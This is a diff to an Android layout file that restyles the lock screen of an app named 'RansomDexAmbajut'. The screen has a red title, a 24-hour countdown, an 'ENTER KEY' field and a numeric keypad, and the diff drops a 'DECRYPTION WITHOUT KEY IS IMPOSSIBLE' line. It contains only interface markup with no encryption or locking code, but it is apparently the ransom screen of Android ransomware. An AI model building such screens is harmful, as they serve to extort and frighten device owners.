@@ -12,55 +12,41 @@
         android:layout_height="wrap_content"
         android:text="RansomDexAmbajut"
         android:textColor="#FF0000"
-        android:textSize="32sp"
+        android:textSize="36sp"
         android:textStyle="bold"
-        android:letterSpacing="0.05"
         android:shadowColor="#FF0000"
-        android:shadowRadius="20" />
-
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:layout_marginTop="2dp"
-        android:text="ENGINE v1.0 - SECURE PROTOCOL"
-        android:textColor="#555555"
-        android:textSize="10sp"
-        android:letterSpacing="0.2" />
+        android:shadowRadius="25" />
 
     <TextView
         android:id="@+id/textTimer"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:layout_marginTop="15dp"
+        android:layout_marginTop="10dp"
         android:text="24:00:00"
         android:textColor="#FF4444"
-        android:textSize="24sp"
+        android:textSize="26sp"
         android:textStyle="bold"
-        android:fontFamily="monospace"
-        android:shadowColor="#FF4444"
-        android:shadowRadius="10" />
+        android:fontFamily="monospace" />
 
     <TextView
         android:id="@+id/textDisplayPassword"
         android:layout_width="match_parent"
-        android:layout_height="75dp"
-        android:layout_marginTop="30dp"
-        android:layout_marginHorizontal="20dp"
+        android:layout_height="70dp"
+        android:layout_marginTop="25dp"
+        android:layout_marginHorizontal="30dp"
         android:background="@drawable/input_glow"
         android:gravity="center"
         android:hint="ENTER KEY"
         android:textColor="#00FF41"
         android:textColorHint="#113311"
         android:textSize="32sp"
-        android:letterSpacing="0.3"
-        android:elevation="10dp" />
+        android:letterSpacing="0.3" />
 
     <TextView
         android:id="@+id/textStatusMessage"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:layout_marginTop="12dp"
-        android:text=""
+        android:layout_marginTop="10dp"
         android:textColor="#FF4444"
         android:textSize="14sp"
         android:textStyle="bold" />
@@ -68,29 +54,27 @@
     <GridLayout
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:layout_marginTop="20dp"
-        android:columnCount="3">
+        android:layout_marginTop="15dp"
+        android:columnCount="3"
+        android:alignmentMode="alignMargins"
+        android:columnOrderPreserved="false">
 
-        <Button android:id="@+id/btn1" style="@style/BSKeyboard" android:text="1" />
-        <Button android:id="@+id/btn2" style="@style/BSKeyboard" android:text="2" />
-        <Button android:id="@+id/btn3" style="@style/BSKeyboard" android:text="3" />
-        <Button android:id="@+id/btn4" style="@style/BSKeyboard" android:text="4" />
-        <Button android:id="@+id/btn5" style="@style/BSKeyboard" android:text="5" />
-        <Button android:id="@+id/btn6" style="@style/BSKeyboard" android:text="6" />
-        <Button android:id="@+id/btn7" style="@style/BSKeyboard" android:text="7" />
-        <Button android:id="@+id/btn8" style="@style/BSKeyboard" android:text="8" />
-        <Button android:id="@+id/btn9" style="@style/BSKeyboard" android:text="9" />
-        <Button android:id="@+id/btnDelete" style="@style/BSKeyboard" android:text="DEL" android:textColor="#FF4444" />
-        <Button android:id="@+id/btn0" style="@style/BSKeyboard" android:text="0" />
-        <Button android:id="@+id/btnUnlock" style="@style/BSKeyboard" android:text="OK" android:textColor="#00FF41" />
+        <Button android:id="@+id/btn1" android:text="1" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        <Button android:id="@+id/btn2" android:text="2" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        <Button android:id="@+id/btn3" android:text="3" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        
+        <Button android:id="@+id/btn4" android:text="4" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        <Button android:id="@+id/btn5" android:text="5" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        <Button android:id="@+id/btn6" android:text="6" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        
+        <Button android:id="@+id/btn7" android:text="7" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        <Button android:id="@+id/btn8" android:text="8" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        <Button android:id="@+id/btn9" android:text="9" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        
+        <Button android:id="@+id/btnDelete" android:text="DEL" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#FF4444" android:textSize="16sp" />
+        <Button android:id="@+id/btn0" android:text="0" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textSize="20sp" />
+        <Button android:id="@+id/btnUnlock" android:text="OK" android:layout_margin="5dp" android:layout_width="80dp" android:layout_height="65dp" android:background="@drawable/btn_glow" android:textColor="#00FF41" android:textStyle="bold" android:textSize="18sp" />
+
     </GridLayout>
-
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:layout_marginTop="30dp"
-        android:text="DECRYPTION WITHOUT KEY IS IMPOSSIBLE"
-        android:textColor="#222222"
-        android:textSize="9sp" />
 
 </LinearLayout>
